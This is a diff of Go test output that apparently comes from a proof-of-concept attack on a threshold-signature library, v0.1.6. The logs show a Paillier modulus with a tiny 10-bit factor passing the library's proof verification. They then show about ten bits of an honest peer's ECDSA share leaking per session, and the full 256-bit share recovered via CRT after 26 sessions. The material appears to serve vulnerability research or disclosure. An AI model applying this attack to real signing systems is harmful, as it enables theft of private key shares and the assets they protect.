@@ -1,15 +1,70 @@
-=== RUN   TestMaliciousNAcceptedByRealLib
-[1] start
-[2] inputs built, N bits = 1024
-[3] testing ModInverse(N, PhiN)
-    M bits: 1020
-[4] calling paillier.GenerateXs(13)
-    xs len = 13
-[5] building proof manually
-    proof built
-[6] calling proof.Verify (REAL vulnerable lib code)
-[7] Verify returned: true
-[8] === ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===
---- PASS: TestMaliciousNAcceptedByRealLib (0.10s)
+=== RUN   TestRealLib_AcceptAndLeak_1024
+[1] target N: 1024 bits  (p_big: 1014 bits  ×  q_small: 10 bits)
+[2] malicious N produced, 1024 bits exactly
+[3] generating Goldwasser proof using malicious factorization
+[4] proof built (13 elements)
+[5] calling proof.Verify against malicious N — the actual buggy code
+[6] Verify returned: true
+[7] honest peer's share (truncated): 16e693268806e455...
+[8] ciphertext under malicious N produced (2047 bits)
+[9] attacker recovered share mod q_small (truth):    158
+    attacker's actual recovered residue:             158
+[10] 10.0 bits of share leaked in this single session
+     extrapolation: ~26 sessions to recover a 256-bit ECDSA share via CRT
+[11] === END-TO-END ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===
+--- PASS: TestRealLib_AcceptAndLeak_1024 (0.08s)
 PASS
-ok  	tss_real_lib_attack	0.127s
+ok  	tss_real_lib_attack	0.103s
+=== RUN   TestRealLib_AcceptAndLeak_2048
+[1] target N: 2048 bits  (p_big: 2038 bits  ×  q_small: 10 bits)
+[2] malicious N produced, 2048 bits exactly
+[3] generating Goldwasser proof using malicious factorization
+[4] proof built (13 elements)
+[5] calling proof.Verify against malicious N — the actual buggy code
+[6] Verify returned: true
+[7] honest peer's share (truncated): c1277a02a93c9614...
+[8] ciphertext under malicious N produced (4096 bits)
+[9] attacker recovered share mod q_small (truth):    818
+    attacker's actual recovered residue:             818
+[10] 10.0 bits of share leaked in this single session
+     extrapolation: ~26 sessions to recover a 256-bit ECDSA share via CRT
+[11] === END-TO-END ATTACK CONFIRMED AGAINST REAL LIB v0.1.6 ===
+--- PASS: TestRealLib_AcceptAndLeak_2048 (3.85s)
+PASS
+ok  	tss_real_lib_attack	3.876s
+=== RUN   TestRealLib_FullShareRecoveryViaCRT
+[goal] recover this 256-bit ECDSA share: 95927529871605170799049668478422896289770098328020361252996156217515203700483
+  session  1  q=1009  leaked 10 bits  cumulative knowledge: 2^10
+  session  2  q=1013  leaked 10 bits  cumulative knowledge: 2^20
+  session  3  q=1019  leaked 10 bits  cumulative knowledge: 2^30
+  session  4  q=1021  leaked 10 bits  cumulative knowledge: 2^40
+  session  5  q=1031  leaked 11 bits  cumulative knowledge: 2^50
+  session  6  q=1033  leaked 11 bits  cumulative knowledge: 2^60
+  session  7  q=1039  leaked 11 bits  cumulative knowledge: 2^70
+  session  8  q=1049  leaked 11 bits  cumulative knowledge: 2^81
+  session  9  q=1051  leaked 11 bits  cumulative knowledge: 2^91
+  session 10  q=1061  leaked 11 bits  cumulative knowledge: 2^101
+  session 11  q=1063  leaked 11 bits  cumulative knowledge: 2^111
+  session 12  q=1069  leaked 11 bits  cumulative knowledge: 2^121
+  session 13  q=1087  leaked 11 bits  cumulative knowledge: 2^131
+  session 14  q=1091  leaked 11 bits  cumulative knowledge: 2^141
+  session 15  q=1093  leaked 11 bits  cumulative knowledge: 2^151
+  session 16  q=1097  leaked 11 bits  cumulative knowledge: 2^161
+  session 17  q=1103  leaked 11 bits  cumulative knowledge: 2^171
+  session 18  q=1109  leaked 11 bits  cumulative knowledge: 2^181
+  session 19  q=1117  leaked 11 bits  cumulative knowledge: 2^191
+  session 20  q=1123  leaked 11 bits  cumulative knowledge: 2^202
+  session 21  q=1129  leaked 11 bits  cumulative knowledge: 2^212
+  session 22  q=1151  leaked 11 bits  cumulative knowledge: 2^222
+  session 23  q=1153  leaked 11 bits  cumulative knowledge: 2^232
+  session 24  q=1163  leaked 11 bits  cumulative knowledge: 2^242
+  session 25  q=1171  leaked 11 bits  cumulative knowledge: 2^252
+  session 26  q=1181  leaked 11 bits  cumulative knowledge: 2^263
+[stop] knownModulus ≥ 2^256 — share fully determined
+
+[result] trueShare = 95927529871605170799049668478422896289770098328020361252996156217515203700483
+         recovered = 95927529871605170799049668478422896289770098328020361252996156217515203700483
+[FINAL] === FULL 256-BIT SHARE RECOVERED VIA REAL LIB Encrypt + Decrypt + CRT ===
+--- PASS: TestRealLib_FullShareRecoveryViaCRT (19.21s)
+PASS
+ok  	tss_real_lib_attack	19.232s
